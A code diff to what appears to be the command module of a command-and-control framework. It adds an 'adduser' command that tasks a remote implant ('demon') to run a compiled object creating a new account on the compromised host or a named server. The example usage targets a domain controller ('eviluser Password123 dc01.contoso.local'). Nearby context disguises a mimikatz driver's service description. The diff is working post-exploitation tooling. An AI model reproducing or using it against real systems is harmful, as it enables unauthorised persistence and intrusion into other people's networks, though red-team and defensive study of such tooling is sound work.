@@ -629,6 +629,39 @@ def sc_description( demonID, *params ):
 
     return TaskID
 
+def adduser( demonID, *params ):
+    TaskID : str    = None
+    demon  : Demon  = None
+    packer = RemOpsPacker()
+    demon  = Demon( demonID )
+
+    num_params = len(params)
+    hostname   = ''
+
+    if num_params < 2:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
+        return False
+
+    if num_params > 3:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
+        return False
+
+    username = params[ 0 ]
+    password = params[ 1 ]
+
+    if num_params == 3:
+        hostname = params[ 2 ]
+
+    packer.addWstr(username)
+    packer.addWstr(password)
+    packer.addWstr(hostname)
+
+    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to add the user {username} in {hostname if hostname != '' else 'the local machine'}" )
+
+    demon.InlineExecute( TaskID, "go", f"bin/adduser.{demon.ProcessArch}.o", packer.getbuffer(), False )
+
+    return TaskID
+
 RegisterCommand( adcs_request, "", "adcs_request", "Request an enrollment certificate", 0, "/CA:ca [/TEMPLATE:template] [/SUBJECT:subject] [/ALTNAME:altname] [/INSTALL] [/MACHINE]", "1337 c:\\windwos\\temp\\test.txt" )
 RegisterCommand( addusertogroup, "", "addusertogroup", "Add the specified user to the specified group", 0, """<USERNAME> <GROUPNAME> <Server> <DOMAIN>
          USERNAME   Required. The user name to activate/enable. 
@@ -736,3 +769,8 @@ RegisterCommand( sc_description, "", "sc_description", "This command sets the de
          DESCRIPTION  Required. The description of the service.
          HOSTNAME     Optional. The host to connect to and run the commnad on. The
                       local system is targeted if a HOSTNAME is not specified.""", "mimidrv \"definitely not a mimikatz kernel driver\"" )
+RegisterCommand( adduser, "", "adduser", "Add a new user to a machine.", 0, """<USERNAME> <PASSWORD> <SERVER>
+         USERNAME   Required. The name of the new user. 
+         PASSWORD   Required. The password of the new user. 
+         SERVER     Optional. If entered, the user will be created on that machine. If not, the
+                    local machine will be used.""", "eviluser Password123 dc01.contoso.local" )
